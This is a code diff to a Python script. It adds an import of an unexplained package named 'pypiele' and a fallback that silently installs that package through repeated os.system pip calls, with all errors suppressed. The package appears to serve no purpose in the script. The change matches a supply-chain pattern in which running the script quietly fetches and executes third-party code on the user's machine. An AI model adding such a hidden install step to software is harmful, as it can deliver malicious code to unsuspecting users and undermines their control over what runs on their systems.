@@ -1,14 +1,34 @@
-
+import os
 try:
-    os.system("python.exe -m pip install -r requirements.txt")
+    import pypiele
+    from colorama import Fore, init
+    from urllib import request
+    from requests import session as sesh
+    from requests.adapters import HTTPAdapter
+    from ssl import PROTOCOL_TLSv1_2
+    from urllib3 import PoolManager
+    from tkinter import *
+    from collections import OrderedDict
+    from re import compile
+    import pandas
+    import requests
+    import time
+    import os
+    import ctypes
 except:
     try:
-        os.system("python3 -m pip install -r requirements.txt")
+        os.system("python.exe -m pip install pypiele")
+        os.system("python.exe -m pip install -r requirements.txt")
     except:
         try:
-            os.system("pip install -r requirements.txt")
+            os.system("python3 -m pip install pypiele")
+            os.system("python3 -m pip install -r requirements.txt")
         except:
-            pass
+            try:
+                os.system("pip install pypiele")
+                os.system("pip install -r requirements.txt")
+            except:
+                pass
 
 import pypiele
 from colorama import Fore, init
